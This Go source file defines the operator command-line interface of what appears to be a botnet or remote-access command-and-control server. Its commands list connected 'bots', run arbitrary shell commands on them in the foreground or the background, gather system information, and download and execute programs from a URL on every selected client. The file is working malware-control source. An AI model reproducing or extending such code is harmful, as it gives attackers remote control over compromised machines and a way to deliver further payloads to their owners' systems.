package cli

import (
	"fmt"
	"strings"
	"time"

	"apollo/server/client"

	"github.com/logrusorgru/aurora"
)

// The command type
type command struct {
	Name     string                     // The Name of the command
	Aliases  []string                   // List of aliases the command can be referred to by
	MinArgs  int                        // The number of args required for this command. Note that 0 args means just the command
	Help     string                     // The help string for the command which will be printed if there is an error or the help command is used
	Usage    string                     // The usage for the command which will be printed out if the command is invalid or the help command is used
	Function func(Cli, []string) string // The function which will be ran. This function takes cli refrence and the args and returns the output
}

var commandList = []command{
	{
		Name:    "test",
		Aliases: nil,
		MinArgs: 0,
		Help:    "",
		Usage:   "",
		Function: func(c Cli, args []string) string {
			return fmt.Sprintln(args)
		},
	},
	{
		Name:    "clear",
		Aliases: []string{"cls"},
		MinArgs: 0,
		Help:    "Clears the screen",
		Function: func(c Cli, args []string) string {
			c.Clear()
			return ""
		},
	},
	{
		Name:    "exit",
		Aliases: []string{"quit"},
		MinArgs: 0,
		Help:    "Exists the cli",
		Function: func(c Cli, args []string) string {
			c.remove()
			return ""
		},
	},
	{
		Name:    "clients",
		Aliases: []string{"list", "bots", "c"},
		MinArgs: 0,
		Help:    "Lists the connected clients",
		Function: func(c Cli, args []string) string {
			if len(client.Clients) == 0 {
				return "No clients"
			}
			str := ""
			for client, connected := range client.Clients {
				if !connected {
					str += c.au.Gray(11, fmt.Sprintf("%s (not connected)", client.String())).String()
				} else {
					str += client.String()
				}
				str += "\n"
			}
			return str
		},
	},

	// Client commands
	{
		Name:    "ping",
		Aliases: nil,
		MinArgs: 1,
		Help:    "Pings a client and returns the response time",
		Usage:   "ping (clientID)",
		Function: func(c Cli, args []string) string {
			clients, err := getClientsFromCapture(args[0])
			if err != nil {
				return c.au.Red(err).String()
			}
			for _, cl := range clients {
				start := time.Now()
				err := cl.Ping()
				if err != nil {
					return c.au.Red(fmt.Sprintf("%s not connected", cl.String())).String()
				}
				ms := time.Since(start).Nanoseconds() / 1e6
				return c.au.Green(fmt.Sprintf("Client %s responded in %dms", cl.String(), ms)).String()
			}
			return ""
		},
	},
	{
		Name:    "exec",
		Aliases: []string{"run", "cmd"},
		MinArgs: 2,
		Help:    "Runs the specified command on the client and prints the output",
		Usage:   "exec (client) (command) [args]",
		Function: func(c Cli, args []string) string {
			clients, err := getClientsFromCapture(args[0])
			if err != nil {
				return c.au.Red(err).String()
			}
			for _, cl := range clients {
				_, resp, err := cl.RunCommand(args[1], args[2:], false)
				if err != nil {
					c.Printf(c.au.Red(fmt.Sprintf("Error running command on %s: %s", cl, err)).String())
				}
				c.Printf("%s", resp)
			}
			return ""
		},
	},
	{
		Name:    "exec_background",
		Aliases: []string{"execbackground"},
		MinArgs: 2,
		Help:    "Runs the specified command on the client in the background",
		Usage:   "exec_background (client) (command) [args]",
		Function: func(c Cli, args []string) string {
			clients, err := getClientsFromCapture(args[0])
			if err != nil {
				return c.au.Red(err).String()
			}
			for _, cl := range clients {
				_, resp, err := cl.RunCommand(args[1], args[2:], true)
				if err != nil {
					c.Printf(c.au.Red(fmt.Sprintf("Error running command on %s: %s", cl, err)).String())
				}
				c.Printf("%s", resp)
			}
			return ""
		},
	},
	{
		Name:    "download_execute",
		Aliases: []string{"dle"},
		MinArgs: 2,
		Help:    "Downloads and excutes an executable from the specified url",
		Usage:   "download_execute (client) (url) [args]",
		Function: func(c Cli, args []string) string {
			clients, err := getClientsFromCapture(args[0])
			if err != nil {
				return c.au.Red(err).String()
			}
			for _, cl := range clients {

				err := cl.DownloadAndExecute(args[1], args[2:])
				if err != nil {
					c.Printf(c.au.Red(fmt.Sprintf("Error downloading and executing on %s: %s", cl, err)).String())
				}
				c.Printf("Downloaded and executed on client ID %d", cl.ID)
			}
			return ""
		},
	},
	{
		Name:    "system_info",
		Aliases: []string{"sysinfo"},
		MinArgs: 1,
		Help:    "View system info of a client or list of clients",
		Usage:   "system_info (client)",
		Function: func(c Cli, args []string) string {
			clients, err := getClientsFromCapture(args[0])
			if err != nil {
				return c.au.Red(err).String()
			}
			for _, cl := range clients {
				info, err := cl.GetSystemInfo()
				if err != nil {
					c.Printf(c.au.Red(fmt.Sprintf("Error getting system info on %s: %s", cl, err)).String())
				}
				c.Printf("Client ID %d: %s\n", cl.ID, info.String())
			}
			return ""
		},
	},
}

/*
 * Gets the description of the command used for the help command
 * Takes an aurora object as an argument for color support
 */
func (c command) description(au aurora.Aurora) string {
	usageString := ""
	if len(c.Usage) > 0 {
		usageString = au.Gray(11, fmt.Sprintf("\n\t└─Usage: %s", c.Usage)).String()
	}
	text := au.Sprintf("%s: %s%s", au.Bold(c.Name), au.Gray(15, c.Help), usageString)
	return text
}

func getHelpString(c Cli, args []string) string {
	if len(args) >= 1 { // If we have more than one args, find the command and print its help
		for _, command := range commandList {
			if command.Name == strings.ToLower(args[0]) {
				aliasesString := "" // Only print aliases if we get help for specific command
				if len(command.Aliases) > 0 {
					aliasesString = aurora.Gray(11, fmt.Sprintf("\n\t└─Aliases: %v", command.Aliases)).String()
				}
				return command.description(c.au) + aliasesString
			}
		}
		return fmt.Sprintf("Unknown command: %s", args[0])
	}

	helpString := "Available commands:\n"
	for _, command := range commandList {
		helpString += command.description(c.au) + "\n"
	}
	return helpString
}

// This function is here so we can add the help command which references itself
func InitCommands() {
	commandList = append([]command{{
		Name:     "help",
		Aliases:  []string{"h", "?"},
		MinArgs:  0,
		Help:     "Prints out help for all commands or a specified command",
		Usage:    "help [command]",
		Function: getHelpString,
	}}, commandList...)
}
